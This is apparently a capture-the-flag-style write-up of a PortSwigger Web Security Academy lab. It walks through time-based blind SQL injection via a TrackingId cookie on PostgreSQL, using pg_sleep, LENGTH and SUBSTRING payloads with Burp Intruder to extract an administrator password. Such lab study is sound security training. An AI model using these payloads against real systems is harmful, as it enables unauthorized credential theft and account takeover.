# Blind SQL Injection with Time Delays and Information Retrieval


**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** Blind SQL Injection


**Database:** PostgreSQL

**Status:** Solved



## 🎯 Objective



Exploit the `TrackingId` cookie to retrieve the password of the `administrator` user using **time-based blind SQL 
injection**, then log in as the administrator.






## 🧠 Core Idea


The application does not return SQL results or errors.



Instead, use a conditional time delay as a Boolean oracle:



```text

Condition TRUE

      ↓

pg_sleep(10)

      ↓

~10 second response



Condition FALSE

      ↓

pg_sleep(0)

      ↓

Normal response

```



> **~10 seconds = TRUE**

> **Normal response = FALSE**



---



## 1. Confirm Time-Based SQL Injection



### TRUE condition



```http

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

```



`1=1` is true, so the server delays for approximately 10 seconds.



### FALSE condition



```http

TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

```



`1=2` is false, so there is no delay.



---



## 2. Confirm the Administrator User



```http


TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```



A ~10-second delay confirms that the `administrator` user exists.



---



## 3. Determine Password Length



Test:



```http

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>N)+THEN+pg_sleep(10)+ELSE+pg_sleep
(0)+END+FROM+users--

```



Increase `N` until the delay disappears.



The lab password length is:



```text

20 characters

```



---



## 4. Extract the Password



Use `SUBSTRING()` to test one character at a time:



```http

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE
+pg_sleep(0)+END+FROM+users--
```



### Intruder configuration



* **Payload type:** Simple list

* **Characters:** `a-z` and `0-9`

* Mark the tested character with `§`.



For each request, check:



```text

Response received

```



The correct character produces approximately:



```text

10,000 ms

```



while incorrect characters respond normally.



### Important



Set:


```text


Maximum concurrent requests = 1

```



in **Resource Pool** so the timing results are more reliable.



---



## 5. Repeat for Every Character



Change the offset:



```text

SUBSTRING(password,1,1)

SUBSTRING(password,2,1)

SUBSTRING(password,3,1)

...

SUBSTRING(password,20,1)

```



For each position:



```text

Test a-z + 0-9

        ↓

Find ~10,000 ms response

        ↓

Record the character

```



Combine all 20 characters to obtain the administrator password.



---



## 🔑 Key Takeaways



```text

Time-Based Blind SQLi

        ↓

CASE WHEN

        ↓

TRUE  → pg_sleep(10)

FALSE → pg_sleep(0)

        ↓

Measure response time

        ↓

LENGTH() → password length

        ↓

SUBSTRING() → extract characters

        ↓

Intruder → automate character testing

```



### Important Functions



```sql

pg_sleep(10)

LENGTH(password)

SUBSTRING(password,N,1)

```



> **Key concept:** In time-based blind SQL injection, **response time acts as the Boolean signal**.



### References


* [PortSwigger — Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
* [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
